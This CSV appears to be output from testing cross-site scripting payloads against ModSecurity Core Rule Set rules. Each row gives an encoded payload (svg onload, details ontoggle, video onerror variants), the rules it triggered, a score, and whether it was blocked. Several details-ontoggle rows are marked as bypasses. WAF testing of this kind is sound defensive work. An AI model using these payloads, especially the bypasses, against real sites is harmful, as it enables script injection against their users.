index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
19,<svg onload=Function(atob('YWxlcnQoMSk='))()>,0,1,block,4,"941100,941120,941160,949110","v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628753158.536280
1152,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details></details><details open></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628849135.496127
1153,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details open></details><details></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628849281.683874
1154,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary><details>x</details></summary></details>",0,1,bypass,2,"941100,941120","v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628849355.524890
1155,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary><details open>y</details></summary></details>",0,1,bypass,2,"941100,941120","v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628849472.541066
1157,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details open>",0,1,bypass,2,"941100,941120","v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628849692.583655
1159,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details ontoggle=""this.parentElement.ontoggle()"" open>",0,1,bypass,2,"941100,941120","v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628849851.017963
1163,"<details open ontoggle=""setTimeout(Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;))""><details>",0,1,bypass,2,"941100,941120","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762885017.331527
1357,"<video src=invalid onerror=""Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941120,941160,949110","v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o18,9v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,27v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628868097.587918
1959,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628927326.290148
1960,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762892743.328860
1961,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628927582.276944
1962,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" /></svg>",0,1,block,4,"941100,941120,941160,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628927683.307465
1963,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' /></svg>,0,1,block,4,"941100,941120,941160,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762892771.928179
1971,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" ></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628928568.055683
1972,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' ></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628928614.095296
1973,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() ></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762892879.728184
1974,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""/></svg>",0,1,block,4,"941100,941120,941160,949110","v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628928828.232803
1975,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'/></svg>,0,1,block,4,"941100,941120,941160,949110","v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628928955.774373
1980,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;1&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628929460.910494
1981,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;1&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628929579.143916
1982,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;1&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628929696.752093
1986,"<svg><svg onload=""Function(&quot;&#97;lert&#40;&#49;&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930035.313032
1987,<svg><svg onload='Function(&quot;&#97;lert&#40;&#49;&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930199.884611
1988,<svg><svg onload=Function(&quot;&#97;lert&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930261.543531
1989,"<svg><svg onload=""Function(&quot;&#97;&#108;ert&#40;&#49;&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930356.856930
1990,<svg><svg onload='Function(&quot;&#97;&#108;ert&#40;&#49;&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930454.866003
1991,<svg><svg onload=Function(&quot;&#97;&#108;ert&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930588.386199
1992,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;rt&#40;&#49;&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930678.041325
1993,<svg><svg onload='Function(&quot;&#97;&#108;&#101;rt&#40;&#49;&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930767.025490
1994,<svg><svg onload=Function(&quot;&#97;&#108;&#101;rt&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930810.664720
1995,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;t&#40;&#49;&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930978.384034
1996,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;t&#40;&#49;&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628931028.694887
1997,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;t&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628931117.708649
1998,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;(&#49;)&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628931256.997733
1999,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;(&#49;)&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628931322.258418
2000,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;(&#49;)&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628931448.210412
2001,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;)&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762893155.730772
2002,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;)&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628931678.664723
2003,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;)&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628931734.946279
2004,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;(1)&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762893180.951647
2005,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;(1)&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762893195.185823
2006,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;(1)&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628932064.556371
2010,"<svg><svg onload=""Function(&quot;&#0097;&#0108;&#0101;&#0114;&#0116;&#0040;&#0049;&#0041;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628932527.049765
2011,<svg><svg onload='Function(&quot;&#0097;&#0108;&#0101;&#0114;&#0116;&#0040;&#0049;&#0041;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628932625.110534
2012,<svg><svg onload=Function(&quot;&#0097;&#0108;&#0101;&#0114;&#0116;&#0040;&#0049;&#0041;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628932743.885961
2013,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#0049;&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628932767.500765
2014,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#0049;&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628932827.076935
2016,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#0041;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628933030.067693
2017,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#0041;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628933285.484326
